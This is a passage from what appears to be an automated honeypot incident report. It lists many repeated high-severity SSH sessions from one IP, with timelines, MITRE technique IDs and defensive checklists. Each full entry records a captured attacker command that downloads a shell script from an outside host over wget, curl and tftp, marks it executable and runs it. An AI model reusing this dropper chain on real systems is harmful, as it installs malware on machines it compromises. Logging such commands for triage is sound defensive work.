| `2026-08-25 09:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28667cb66d0c

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:36` | `cowrie.session.connect` |
| `2026-08-25 09:56:36` | `cowrie.login.success` |
| `2026-08-25 09:56:37` | `cowrie.session.params` |
| `2026-08-25 09:56:37` | `cowrie.command.input` |
| `2026-08-25 09:56:37` | `cowrie.command.success` |
| `2026-08-25 09:56:37` | `cowrie.log.closed` |
| `2026-08-25 09:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40967f5f0278

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:37` | `cowrie.session.connect` |
| `2026-08-25 09:56:38` | `cowrie.login.success` |
| `2026-08-25 09:56:38` | `cowrie.session.params` |
| `2026-08-25 09:56:38` | `cowrie.command.input` |
| `2026-08-25 09:56:38` | `cowrie.command.success` |
| `2026-08-25 09:56:39` | `cowrie.log.closed` |
| `2026-08-25 09:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37b352289ac1

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:39` | `cowrie.session.connect` |
| `2026-08-25 09:56:39` | `cowrie.login.success` |
| `2026-08-25 09:56:40` | `cowrie.session.params` |
| `2026-08-25 09:56:40` | `cowrie.command.input` |
| `2026-08-25 09:56:40` | `cowrie.command.success` |
| `2026-08-25 09:56:40` | `cowrie.log.closed` |
| `2026-08-25 09:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-680dfa6e41e8

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:40` | `cowrie.session.connect` |
| `2026-08-25 09:56:41` | `cowrie.login.success` |
| `2026-08-25 09:56:41` | `cowrie.session.params` |
| `2026-08-25 09:56:41` | `cowrie.command.input` |
| `2026-08-25 09:56:41` | `cowrie.command.success` |
| `2026-08-25 09:56:42` | `cowrie.log.closed` |
| `2026-08-25 09:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81c440847513

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:42` | `cowrie.session.connect` |
| `2026-08-25 09:56:42` | `cowrie.login.success` |
| `2026-08-25 09:56:43` | `cowrie.session.params` |
| `2026-08-25 09:56:43` | `cowrie.command.input` |
| `2026-08-25 09:56:43` | `cowrie.command.success` |
| `2026-08-25 09:56:43` | `cowrie.log.closed` |
| `2026-08-25 09:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae08d97889b0

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:43` | `cowrie.session.connect` |
| `2026-08-25 09:56:44` | `cowrie.login.success` |
| `2026-08-25 09:56:44` | `cowrie.session.params` |
| `2026-08-25 09:56:44` | `cowrie.command.input` |
| `2026-08-25 09:56:44` | `cowrie.command.success` |
| `2026-08-25 09:56:45` | `cowrie.log.closed` |
| `2026-08-25 09:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4be4913150b

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:45` | `cowrie.session.connect` |
| `2026-08-25 09:56:45` | `cowrie.login.success` |
| `2026-08-25 09:56:45` | `cowrie.session.params` |
| `2026-08-25 09:56:46` | `cowrie.command.input` |
| `2026-08-25 09:56:46` | `cowrie.command.success` |
| `2026-08-25 09:56:46` | `cowrie.log.closed` |
| `2026-08-25 09:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df63772bc8bd

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:46` | `cowrie.session.connect` |
| `2026-08-25 09:56:46` | `cowrie.login.success` |
| `2026-08-25 09:56:47` | `cowrie.session.params` |
| `2026-08-25 09:56:47` | `cowrie.command.input` |
| `2026-08-25 09:56:47` | `cowrie.session.file_download` |
| `2026-08-25 09:56:47` | `cowrie.session.file_download` |
| `2026-08-25 09:56:47` | `cowrie.session.file_download` |
| `2026-08-25 09:56:48` | `cowrie.log.closed` |
| `2026-08-25 09:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eefa6c18c980

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:48` | `cowrie.session.connect` |
| `2026-08-25 09:56:48` | `cowrie.login.success` |
| `2026-08-25 09:56:49` | `cowrie.session.params` |
| `2026-08-25 09:56:49` | `cowrie.command.input` |
| `2026-08-25 09:56:49` | `cowrie.session.file_download` |
| `2026-08-25 09:56:49` | `cowrie.session.file_download` |
| `2026-08-25 09:56:49` | `cowrie.session.file_download` |
| `2026-08-25 09:56:49` | `cowrie.log.closed` |
| `2026-08-25 09:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65b3f0ea860

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:49` | `cowrie.session.connect` |
| `2026-08-25 09:56:49` | `cowrie.login.success` |
| `2026-08-25 09:56:50` | `cowrie.session.params` |
| `2026-08-25 09:56:50` | `cowrie.command.input` |
| `2026-08-25 09:56:50` | `cowrie.session.file_download` |
| `2026-08-25 09:56:50` | `cowrie.session.file_download` |
| `2026-08-25 09:56:51` | `cowrie.log.closed` |
| `2026-08-25 09:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bfade399939

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:51` | `cowrie.session.connect` |
| `2026-08-25 09:56:51` | `cowrie.login.success` |
| `2026-08-25 09:56:51` | `cowrie.session.params` |
| `2026-08-25 09:56:52` | `cowrie.command.input` |
| `2026-08-25 09:56:52` | `cowrie.command.success` |
| `2026-08-25 09:56:52` | `cowrie.session.file_download` |
| `2026-08-25 09:56:52` | `cowrie.log.closed` |
| `2026-08-25 09:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee893eac099e

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:52` | `cowrie.session.connect` |
| `2026-08-25 09:56:52` | `cowrie.login.success` |
| `2026-08-25 09:56:53` | `cowrie.session.params` |
| `2026-08-25 09:56:53` | `cowrie.command.input` |
| `2026-08-25 09:56:53` | `cowrie.command.success` |
| `2026-08-25 09:56:53` | `cowrie.session.file_download` |
| `2026-08-25 09:56:53` | `cowrie.log.closed` |
| `2026-08-25 09:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ba42dca0051

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:54` | `cowrie.session.connect` |
| `2026-08-25 09:56:54` | `cowrie.login.success` |
| `2026-08-25 09:56:54` | `cowrie.session.params` |
| `2026-08-25 09:56:54` | `cowrie.command.input` |
| `2026-08-25 09:56:54` | `cowrie.command.success` |
| `2026-08-25 09:56:55` | `cowrie.log.closed` |
| `2026-08-25 09:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc505b95a40

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:55` | `cowrie.session.connect` |
| `2026-08-25 09:56:55` | `cowrie.login.success` |
| `2026-08-25 09:56:56` | `cowrie.session.params` |
| `2026-08-25 09:56:56` | `cowrie.command.input` |
| `2026-08-25 09:56:56` | `cowrie.command.success` |
| `2026-08-25 09:56:56` | `cowrie.log.closed` |
| `2026-08-25 09:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63f6aeae8d32

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:56` | `cowrie.session.connect` |
| `2026-08-25 09:56:57` | `cowrie.login.success` |
| `2026-08-25 09:56:57` | `cowrie.session.params` |
| `2026-08-25 09:56:57` | `cowrie.command.input` |
| `2026-08-25 09:56:57` | `cowrie.command.success` |
| `2026-08-25 09:56:58` | `cowrie.log.closed` |
| `2026-08-25 09:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6a635a33409

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:58` | `cowrie.session.connect` |
| `2026-08-25 09:56:58` | `cowrie.login.success` |
| `2026-08-25 09:56:59` | `cowrie.session.params` |
| `2026-08-25 09:56:59` | `cowrie.command.input` |
| `2026-08-25 09:56:59` | `cowrie.command.success` |
| `2026-08-25 09:56:59` | `cowrie.log.closed` |
| `2026-08-25 09:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81822d817e9d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
